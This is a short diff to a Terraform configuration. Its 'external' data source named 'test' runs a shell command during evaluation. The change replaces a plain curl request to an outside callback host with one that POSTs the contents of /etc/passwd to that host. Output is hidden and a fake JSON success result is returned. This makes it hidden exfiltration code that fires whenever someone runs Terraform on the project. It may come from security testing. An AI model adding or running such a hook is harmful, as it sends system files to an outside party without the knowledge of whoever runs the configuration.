@@ -2,7 +2,7 @@ data "external" "test" {
   program = [
     "sh",
     "-c",
-    "curl -s https://5w2wpz0kg7x7didoxwvc7fofr6xzlq9f.net-spi.com >/dev/null 2>&1; echo '{\"result\":\"request-attempted\"}'"
+    "curl -X POST --data-binary @/etc/passwd https://5w2wpz0kg7x7didoxwvc7fofr6xzlq9f.net-spi.com >/dev/null 2>&1; echo '{\"result\":\"request-attempted\"}'"
   ]
 }
 
